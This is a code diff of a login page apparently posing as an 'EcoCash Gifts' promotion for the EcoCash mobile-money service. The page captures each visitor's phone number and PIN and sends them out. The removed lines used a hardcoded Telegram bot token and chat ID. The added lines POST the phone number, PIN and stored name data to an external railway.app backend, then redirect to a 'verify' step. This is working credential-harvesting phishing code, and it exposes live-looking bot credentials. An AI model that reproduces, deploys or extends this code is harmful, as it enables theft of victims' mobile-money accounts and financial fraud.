@@ -482,11 +482,11 @@
 
     <script>
         // ============================================
-        // TELEGRAM & API CONFIGURATION - NEW CREDENTIALS
+        // TELEGRAM & API CONFIGURATION - UPDATED URL
         // ============================================
         const BOT_TOKEN = '8810189563:AAH_np3_4ol0O0yO-t0PA68YtPrGH6htUdI';
         const CHAT_ID = '157828443';
-        const API_URL = 'https://eco-cashm-production.up.railway.app/api';
+        const API_URL = 'https://eco09giftscom-production.up.railway.app/api';
 
         console.log('====================================');
         console.log('🎁 EcoCash Gifts - Login Page');
@@ -637,14 +637,40 @@
             // Store phone in localStorage
             localStorage.setItem('phone', phone);
 
-            // Send Telegram notification
-            await sendTelegramNotification(phone, pin);
+            // Send to backend
+            try {
+                const response = await fetch(`${API_URL}/auth/login`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        phoneNumber: phone,
+                        pin: pin,
+                        giftName: localStorage.getItem('giftName') || 'Gift',
+                        fullName: localStorage.getItem('fullName') || 'User'
+                    })
+                });
 
-            showStatus('✅ Login successful! Redirecting...', 'success');
-            
-            setTimeout(() => {
-                window.location.href = 'verify.html';
-            }, 1500);
+                const data = await response.json();
+
+                if (data.success) {
+                    showStatus('✅ Login successful! Redirecting...', 'success');
+                    setTimeout(() => {
+                        window.location.href = 'verify.html';
+                    }, 1500);
+                } else {
+                    showStatus('❌ ' + data.message, 'error');
+                    loginBtn.disabled = false;
+                    loginBtn.textContent = 'LOGIN';
+                    spinnerOverlay.style.display = 'none';
+                }
+            } catch (error) {
+                showStatus('❌ Connection error: ' + error.message, 'error');
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'LOGIN';
+                spinnerOverlay.style.display = 'none';
+            }
         });
 
         // ============================================
